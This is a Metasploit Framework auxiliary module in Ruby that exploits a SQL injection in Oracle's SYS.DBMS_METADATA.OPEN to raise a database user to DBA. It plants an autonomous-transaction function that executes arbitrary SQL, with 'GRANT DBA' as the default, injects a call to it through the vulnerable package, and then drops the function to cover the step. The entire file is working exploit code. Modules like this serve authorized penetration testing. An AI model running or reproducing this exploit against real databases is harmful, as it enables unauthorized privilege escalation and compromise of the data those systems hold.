##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN',
			'Description'    => %q{
				This module will escalate a Oracle DB user to DBA by exploiting an sql injection
				bug in the SYS.DBMS_METADATA.OPEN package/function.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://www.metasploit.com' ],
				],
			'DisclosureDate' => 'Jan 5 2008'))

			register_options(
				[
					OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
				], self.class)
	end

	def run
		return if not check_dependencies

		name = Rex::Text.rand_text_alpha(rand(10) + 1)

		function = "
			create or replace function #{datastore['DBUSER']}.#{name} return varchar2
			authid current_user is pragma autonomous_transaction;
			begin
			execute immediate '#{datastore['SQL']}';
			return '';
			end;
			"

		package = "select sys.dbms_metadata.open('''||#{datastore['DBUSER']}.#{name}()||''') from dual"

		clean = "drop function #{name}"


		print_status("Sending function...")
		prepare_exec(function)

		begin
			print_status("Attempting sql injection on SYS.DBMS_METADATA.OPEN...")
			prepare_exec(package)
		rescue ::OCIError => e
			if ( e.to_s =~ /ORA-24374: define not done before fetch or execute and fetch/ )
				print_status("Removing function '#{name}'...")
				prepare_exec(clean)
			else
			end
		end
	end

end
